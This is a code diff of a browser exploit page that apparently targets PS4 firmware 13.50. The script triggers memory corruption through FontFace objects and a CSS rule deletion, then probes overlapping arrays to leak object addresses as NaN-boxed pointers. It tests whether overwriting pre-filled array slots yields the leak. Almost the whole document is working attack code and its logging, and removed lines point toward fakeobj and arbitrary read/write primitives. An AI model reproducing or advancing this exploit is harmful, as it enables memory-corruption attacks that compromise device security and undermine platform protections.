@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PS4 13.50 - Index Scanner</title>
+<title>PS4 13.50 - Overwrite Theory</title>
 </head>
 <body>
-<h1 id="status">Finding Magic Index</h1>
+<h1 id="status">Testing Overwrite Theory</h1>
 <button onclick="runExploit()" style="font-size: 24px; padding: 15px;">RUN</button>
 <div id="log" style="font-family: monospace; font-size: 10px; white-space: pre-wrap; border: 2px solid #0f0; padding: 10px; max-height: 88vh; overflow-y: scroll; background: #000; color: #0f0;"></div>
 
@@ -39,29 +39,21 @@ class Int64 {
         return new Int64(parts[0], parts[1]);
     }
     
-    asDouble() {
-        let buf = new ArrayBuffer(8);
-        let u32 = new Uint32Array(buf);
-        u32[0] = this.low;
-        u32[1] = this.high;
-        return new Float64Array(buf)[0];
-    }
-    
     toString() {
         return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
     }
 }
 
-let workingIndices = [];
-
 function runExploit() {
     log('╔════════════════════════════════════════════════╗');
-    log('║   PS4 13.50 - MAGIC INDEX SCANNER              ║');
+    log('║   THEORY: Leak happens on OVERWRITE           ║');
     log('╚════════════════════════════════════════════════╝\n');
     
-    log('[*] Goal: Find which array indices leak addresses');
-    log('[*] Testing indices: 0, 5, 10, 15, 20... up to 100');
-    log('[*] Looking for 0x7ff8... pattern (NaN-boxed pointers)\n');
+    log('[HYPOTHESIS]');
+    log('  The working Test 4 had objectArray PRE-FILLED');
+    log('  with {id: i} objects at EVERY index.');
+    log('  Then we OVERWROTE objectArray[50].');
+    log('  Maybe leak happens on OVERWRITE, not fresh store!\n');
     
     // Setup
     let style = document.createElement('style');
@@ -69,28 +61,22 @@ function runExploit() {
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
-    // Create arrays with MORE space
-    let floatArray = new Float64Array(150);
-    let objectArray = new Array(150);
+    // Create arrays
+    let floatArray = new Float64Array(100);
+    let objectArray = new Array(100);
     
-    // Fill with KNOWN pattern
-    for (let i = 0; i < 150; i++) {
-        floatArray[i] = 1.1 * (i + 1); // Pattern: 1.1, 2.2, 3.3, ...
-        objectArray[i] = { id: i, marker: 0xBEEF0000 + i };
+    // CRITICAL: PRE-FILL both arrays completely
+    log('[*] PRE-FILLING arrays (matching working version):\n');
+    
+    for (let i = 0; i < 100; i++) {
+        floatArray[i] = 1.1 * (i + 1);
+        objectArray[i] = { id: i, marker: 0xBEEF0000 + i }; // PRE-FILLED!
     }
     
-    log('[*] Created Float64Array[150] and Array[150]');
-    log('[*] Pattern value at [50]: ' + floatArray[50].toFixed(2));
-    log('[*] (Should be 56.10 if no leak)\n');
-    
-    // Target object for all tests
-    let targetObject = {
-        magic: 0xDEADBEEF,
-        test: "TARGET",
-        value: 31337
-    };
-    
-    log('[*] Target object: ' + JSON.stringify(targetObject) + '\n');
+    log('[*] Float64Array[100] filled with pattern');
+    log('[*] Array[100] filled with objects {id: i}');
+    log('[*] objectArray[50] currently: ' + JSON.stringify(objectArray[50]));
+    log('[*] floatArray[50] currently: ' + floatArray[50] + '\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -107,185 +93,205 @@ function runExploit() {
                 log('[+] ═══ INSIDE GETTER ═══\n');
                 
                 // Create corrupted fonts
-                log('[*] Creating corrupted fonts...');
                 let corrupted = [];
                 for (let i = 0; i < 50; i++) {
                     corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                         unicodeRange: 'U+' + (0x100 + i).toString(16)
                     }));
                 }
-                log('[*] Created ' + corrupted.length + ' corrupted fonts\n');
+                log('[*] Created ' + corrupted.length + ' corrupted fonts');
                 
                 // Trigger corruption
-                log('[*] Triggering corruption...');
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
                 log('[*] Corruption triggered!\n');
                 
                 // ============================================
-                // INDEX SCAN
+                // TEST 1: OVERWRITE Pre-filled Index
                 // ============================================
                 
                 log('╔════════════════════════════════════════╗');
-                log('║         SCANNING INDICES               ║');
+                log('║  TEST 1: OVERWRITE at index 50        ║');
                 log('╚════════════════════════════════════════╝\n');
                 
-                // Test every 5th index from 0 to 100
-                for (let testIdx = 0; testIdx <= 100; testIdx += 5) {
-                    try {
-                        // Expected pattern value at this index
-                        let expectedPattern = 1.1 * (testIdx + 1);
-                        
-                        // Store target object at this index
-                        objectArray[testIdx] = targetObject;
-                        
-                        // Read from float array at SAME index
-                        let leaked = floatArray[testIdx];
-                        
-                        // Convert to Int64
-                        let addr = Int64.fromDouble(leaked);
-                        
-                        // Check if it changed from pattern
-                        let changed = Math.abs(leaked - expectedPattern) > 0.01;
-                        
-                        // Check if high word looks like NaN-box (0x7ff8 or 0xfff8)
-                        let isNaNBoxed = (addr.high & 0xfff80000) === 0x7ff80000 || 
-                                        (addr.high & 0xfff80000) === 0xfff80000;
-                        
-                        // Check if it's a likely address (high word > 0x1000000)
-                        let likelyAddr = addr.high >= 0x01000000;
-                        
-                        // Determine result
-                        let result = '';
-                        if (isNaNBoxed) {
-                            result = '[+++] NaN-BOXED POINTER!';
-                            workingIndices.push(testIdx);
-                        } else if (changed && likelyAddr) {
-                            result = '[++] CHANGED & HIGH WORD!';
-                            workingIndices.push(testIdx);
-                        } else if (changed) {
-                            result = '[+] Changed from pattern';
-                        } else {
-                            result = '[-] Still pattern (' + expectedPattern.toFixed(1) + ')';
-                        }
-                        
-                        log('[' + String(testIdx).padStart(3, ' ') + '] ' + addr.toString() + '  ' + result);
-                        
-                    } catch(e) {
-                        log('[' + String(testIdx).padStart(3, ' ') + '] ERROR: ' + e.message);
+                log('[*] Current objectArray[50]: ' + JSON.stringify(objectArray[50]));
+                log('[*] Current floatArray[50]: ' + floatArray[50] + '\n');
+                
+                let targetObj = { target: true, marker: 0xDEADBEEF };
+                
+                log('[*] OVERWRITING objectArray[50] with new object...');
+                objectArray[50] = targetObj; // OVERWRITE!
+                
+                log('[*] Reading floatArray[50]...');
+                let leaked = floatArray[50];
+                
+                log('\n[RESULT]');
+                log('  Leaked value: ' + leaked);
+                log('  Type: ' + typeof leaked);
+                
+                if (typeof leaked === 'number') {
+                    let addr = Int64.fromDouble(leaked);
+                    log('  As Int64: ' + addr.toString());
+                    
+                    let expectedPattern = 56.1; // 1.1 * 51
+                    let changed = Math.abs(leaked - expectedPattern) > 0.01;
+                    
+                    log('  Expected pattern: ' + expectedPattern);
+                    log('  Changed from pattern: ' + changed);
+                    
+                    if ((addr.high & 0xfff80000) === 0x7ff80000) {
+                        log('  [+++] NaN-BOXED POINTER LEAKED!');
+                        log('  [+++] SUCCESS - OVERWRITE THEORY CONFIRMED!');
+                    } else if (changed) {
+                        log('  [+] Value changed but not NaN-boxed');
+                        log('  [+] Addr: ' + addr.toString());
+                    } else {
+                        log('  [-] Still pattern value (no leak)');
                     }
                 }
                 
                 log('\n');
                 
                 // ============================================
-                // DEEP SCAN ON WORKING INDICES
+                // TEST 2: Multiple Overwrites
                 // ============================================
                 
-                if (workingIndices.length > 0) {
-                    log('╔════════════════════════════════════════╗');
-                    log('║       DEEP SCAN - WORKING INDICES      ║');
-                    log('╚════════════════════════════════════════╝\n');
-                    
-                    log('[*] Found ' + workingIndices.length + ' working indices: ' + workingIndices.join(', ') + '\n');
-                    
-                    // Test each working index with multiple objects
-                    for (let i = 0; i < workingIndices.length; i++) {
-                        let idx = workingIndices[i];
-                        
-                        log('[DEEP TEST Index ' + idx + ']');
-                        
-                        let testObjs = [
-                            { test: 1 },
-                            { test: 2 },
-                            new ArrayBuffer(0x100)
-                        ];
-                        
-                        for (let j = 0; j < testObjs.length; j++) {
-                            objectArray[idx] = testObjs[j];
-                            let leaked = floatArray[idx];
-                            let addr = Int64.fromDouble(leaked);
-                            
-                            log('  Obj ' + j + ': ' + addr.toString());
-                        }
-                        
-                        log('');
-                    }
-                    
-                } else {
-                    log('╔════════════════════════════════════════╗');
-                    log('║         NO WORKING INDICES FOUND       ║');
-                    log('╚════════════════════════════════════════╝\n');
-                    
-                    log('[!] No indices leaked NaN-boxed pointers');
-                    log('[*] Checking if ANY indices changed from pattern:\n');
-                    
-                    // Show indices that at least changed
-                    for (let testIdx = 0; testIdx <= 100; testIdx += 5) {
-                        let expectedPattern = 1.1 * (testIdx + 1);
-                        let leaked = floatArray[testIdx];
-                        
-                        if (Math.abs(leaked - expectedPattern) > 0.01) {
-                            let addr = Int64.fromDouble(leaked);
-                            log('  [' + testIdx + '] Changed: ' + addr.toString());
-                        }
-                    }
-                }
-                
-                // ============================================
-                // RECOMMENDATIONS
-                // ============================================
-                
-                log('\n╔════════════════════════════════════════╗');
-                log('║           RECOMMENDATIONS              ║');
+                log('╔════════════════════════════════════════╗');
+                log('║  TEST 2: Multiple OVERWRITES          ║');
                 log('╚════════════════════════════════════════╝\n');
                 
-                if (workingIndices.length > 0) {
-                    log('[SUCCESS] Working indices found!');
-                    log('[NEXT] Use index ' + workingIndices[0] + ' for reliable addrof');
-                    log('[NEXT] Build fakeobj with same technique');
-                    log('[NEXT] Create fake TypedArray for arb R/W');
-                } else {
-                    log('[ANALYSIS]');
-                    log('  Possible reasons:');
-                    log('  1. Arrays aren\'t overlapping in this run');
-                    log('  2. Corruption timing is critical');
-                    log('  3. Need different array setup');
+                let testObjects = [
+                    { test: 1, val: 0x1111 },
+                    { test: 2, val: 0x2222 },
+                    { test: 3, val: 0x3333 },
+                    new ArrayBuffer(0x100),
+                    new Uint32Array(16)
+                ];
+                
+                let testIndices = [40, 45, 50, 55, 60]; // All pre-filled
+                
+                for (let i = 0; i < testIndices.length; i++) {
+                    let idx = testIndices[i];
+                    let obj = testObjects[i % testObjects.length];
+                    
+                    log('[Test ' + i + '] Index ' + idx);
+                    log('  Original: ' + JSON.stringify(objectArray[idx]));
+                    
+                    // OVERWRITE
+                    objectArray[idx] = obj;
+                    let leaked = floatArray[idx];
+                    
+                    if (typeof leaked === 'number') {
+                        let addr = Int64.fromDouble(leaked);
+                        let expectedPattern = 1.1 * (idx + 1);
+                        let changed = Math.abs(leaked - expectedPattern) > 0.01;
+                        
+                        log('  Leaked: ' + addr.toString());
+                        
+                        if ((addr.high & 0xfff80000) === 0x7ff80000) {
+                            log('  [+++] NaN-BOXED!');
+                        } else if (changed) {
+                            log('  [+] Changed');
+                        } else {
+                            log('  [-] Pattern');
+                        }
+                    }
                     log('');
-                    log('[TRY]');
-                    log('  - Refresh page and run again');
-                    log('  - Arrays might align differently');
-                    log('  - First run often works best');
                 }
                 
-                log('\n[!] Returning - OOM will occur\n');
+                // ============================================
+                // TEST 3: Compare with Empty Slots
+                // ============================================
                 
-                window.workingIndices = workingIndices;
+                log('╔════════════════════════════════════════╗');
+                log('║  TEST 3: Empty Slots vs Pre-filled    ║');
+                log('╚════════════════════════════════════════╝\n');
+                
+                // Create NEW arrays with SOME empty slots
+                let sparsefloat = new Float64Array(50);
+                let sparseObj = new Array(50);
+                
+                // Fill only HALF
+                for (let i = 0; i < 25; i++) {
+                    sparsefloat[i] = 2.2 * (i + 1);
+                    sparseObj[i] = { sparse: i };
+                }
+                // Indices 25-49 are EMPTY in sparseObj
+                
+                log('[*] Created sparse arrays (0-24 filled, 25-49 empty)');
+                log('[*] Testing index 10 (PRE-FILLED):');
+                
+                let oldVal = sparseObj[10];
+                sparseObj[10] = { new: true };
+                let leak1 = sparsefloat[10];
+                let addr1 = Int64.fromDouble(leak1);
+                log('  OVERWRITE result: ' + addr1.toString());
+                
+                log('[*] Testing index 30 (EMPTY):');
+                sparseObj[30] = { new: true };
+                let leak2 = sparsefloat[30];
+                let addr2 = Int64.fromDouble(leak2);
+                log('  FRESH STORE result: ' + addr2.toString());
+                
+                log('\n[COMPARISON]');
+                log('  Overwrite (idx 10): ' + addr1.toString());
+                log('  Fresh store (idx 30): ' + addr2.toString());
+                
+                if ((addr1.high & 0xfff80000) === 0x7ff80000 && 
+                    (addr2.high & 0xfff80000) !== 0x7ff80000) {
+                    log('  [+++] OVERWRITE LEAKS, FRESH STORE DOES NOT!');
+                    log('  [+++] THEORY CONFIRMED!');
+                } else if ((addr1.high & 0xfff80000) === 0x7ff80000) {
+                    log('  [+] Overwrite leaked NaN-boxed pointer');
+                } else {
+                    log('  [-] Neither leaked NaN-boxed pointer');
+                }
+                
+                // ============================================
+                // SUMMARY
+                // ============================================
+                
+                log('\n\n╔════════════════════════════════════════╗');
+                log('║              SUMMARY                   ║');
+                log('╚════════════════════════════════════════╝\n');
+                
+                log('[THEORY] Leak happens on OVERWRITE of existing objects');
+                log('[TEST 1] Overwrite index 50 (pre-filled)');
+                log('[TEST 2] Multiple overwrites at different indices');
+                log('[TEST 3] Overwrite vs fresh store comparison\n');
+                
+                log('[CONCLUSION]');
+                log('  Review results above.');
+                log('  If Test 1 or Test 2 show [+++] NaN-BOXED:');
+                log('    → Theory confirmed!');
+                log('    → Always pre-fill arrays before corruption');
+                log('    → Overwrite during exploitation');
+                log('');
+                log('  If no NaN-boxed pointers:');
+                log('    → Arrays not overlapping this run');
+                log('    → Try refreshing page');
+                log('    → Corruption might be timing-sensitive');
+                
+                log('\n[!] Returning - OOM will occur\n');
             }
             
             return undefined;
         }
     });
     
+    log('[*] Setup complete');
+    log('[*] Arrays PRE-FILLED with objects');
     log('[*] Starting exploit...\n');
-    document.fonts.load('1em x', 'AB');
     
-    setTimeout(() => {
-        log('\n[POST-OOM]');
-        if (window.workingIndices && window.workingIndices.length > 0) {
-            log('[SUCCESS] Working indices: ' + window.workingIndices.join(', '));
-        } else {
-            log('[INFO] Try refreshing and running again');
-        }
-    }, 100);
+    document.fonts.load('1em x', 'AB');
 }
 
 log('╔════════════════════════════════════════════════╗');
-log('║   PS4 13.50 - FIND MAGIC INDEX                 ║');
+log('║   PS4 13.50 - OVERWRITE THEORY TEST            ║');
 log('╚════════════════════════════════════════════════╝\n');
-log('[*] This will test indices 0, 5, 10, 15... 100');
-log('[*] Looking for which leak addresses');
-log('[*] Then deep-test working indices\n');
+log('[*] Testing if leak happens on OVERWRITE');
+log('[*] Arrays will be PRE-FILLED before corruption');
+log('[*] Then we overwrite during exploitation\n');
 log('Click RUN\n');
 
 </script>
